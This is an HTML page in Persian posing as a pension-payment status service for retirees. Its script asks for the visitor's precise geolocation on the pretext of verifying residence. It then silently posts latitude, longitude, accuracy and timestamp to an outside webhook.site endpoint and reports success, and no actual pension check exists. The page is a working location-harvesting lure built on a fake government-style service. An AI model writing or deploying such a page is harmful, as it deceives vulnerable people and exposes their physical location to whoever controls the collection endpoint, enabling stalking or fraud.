<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سامانه بررسی وضعیت حقوق</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: Tahoma, Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f4f7f6;
            direction: rtl;
            margin: 0;
        }

        .container {
            max-width: 500px;
            margin: 50px auto;
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }

        h2 {
            color: #2c3e50;
            margin-bottom: 20px;
        }

        p {
            color: #7f8c8d;
            line-height: 2;
            margin-bottom: 20px;
        }

        .btn {
            background-color: #2ecc71;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            border-radius: 10px;
            transition: background 0.3s;
            width: 100%;
            max-width: 300px;
        }

        .btn:hover {
            background-color: #27ae60;
        }

        .btn:disabled {
            background-color: #bdc3c7;
            cursor: wait;
            opacity: 0.7;
        }

        #result {
            margin-top: 25px;
            font-weight: bold;
            color: #34495e;
            overflow-wrap: anywhere;
            min-height: 20px;
        }

        .error-msg {
            color: #e74c3c !important;
        }

        .success-msg {
            color: #27ae60 !important;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>سامانه بررسی وضعیت حقوق بازنشستگان</h2>
    <p>برای بررسی منطقه سکونت و مشاهده وضعیت پرداخت‌ها، لطفاً اجازه دسترسی به موقعیت مکانی خود را بدهید.</p>

    <button class="btn" id="locationBtn">
        تأیید منطقه سکونت و ورود
    </button>

    <div id="result">
        منتظر درخواست شما هستیم.
    </div>
</div>

<script>
    const button = document.getElementById("locationBtn");
    const result = document.getElementById("result");
    const WEBHOOK_URL = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";

    button.addEventListener("click", getLocation);

    function getLocation() {
        // ریست کردن وضعیت نمایش
        result.textContent = "در حال بررسی دسترسی...";
        result.className = "";
        button.disabled = true;

        // بررسی پشتیبانی مرورگر
        if (!navigator.geolocation) {
            result.textContent = "مرورگر شما از قابلیت مکان‌یابی پشتیبانی نمی‌کند.";
            result.className = "error-msg";
            button.disabled = false;
            return;
        }

        // درخواست موقعیت مکانی با تنظیمات
        navigator.geolocation.getCurrentPosition(
            onSuccess,
            onError,
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }

    function onSuccess(position) {
        const latitude  = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy  = position.coords.accuracy;

        result.textContent = "موقعیت دریافت شد. در حال ارسال...";
        result.className = "";

        // ارسال به وبهوک
        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                lat: latitude,
                lng: longitude,
                accuracy: accuracy,
                timestamp: new Date().toISOString()
            })
        })
        .then(function (response) {
            if (!response.ok) {
                throw new Error("HTTP " + response.status);
            }
            return response.json().catch(function () { return {}; });
        })
        .then(function () {
            result.textContent = "اطلاعات با موفقیت ثبت شد ✅";
            result.className = "success-msg";
        })
        .catch(function (err) {
            console.error("خطای ارسال:", err);
            result.textContent = "خطا در ارتباط با سرور. دوباره تلاش کنید.";
            result.className = "error-msg";
        })
        .finally(function () {
            button.disabled = false;
        });
    }

    function onError(error) {
        button.disabled = false;
        result.className = "error-msg";

        switch (error.code) {
            case error.PERMISSION_DENIED:
                result.textContent = "دسترسی به موقعیت مکانی رد شد. لطفاً از تنظیمات مرورگر اجازه دهید.";
                break;
            case error.POSITION_UNAVAILABLE:
                result.textContent = "اطلاعات موقعیت مکانی در دسترس نیست.";
                break;
            case error.TIMEOUT:
                result.textContent = "زمان درخواست موقعیت به پایان رسید. دوباره تلاش کنید.";
                break;
            default:
                result.textContent = "خطای ناشناخته در دریافت موقعیت.";
        }
    }
</script>

</body>
</html>
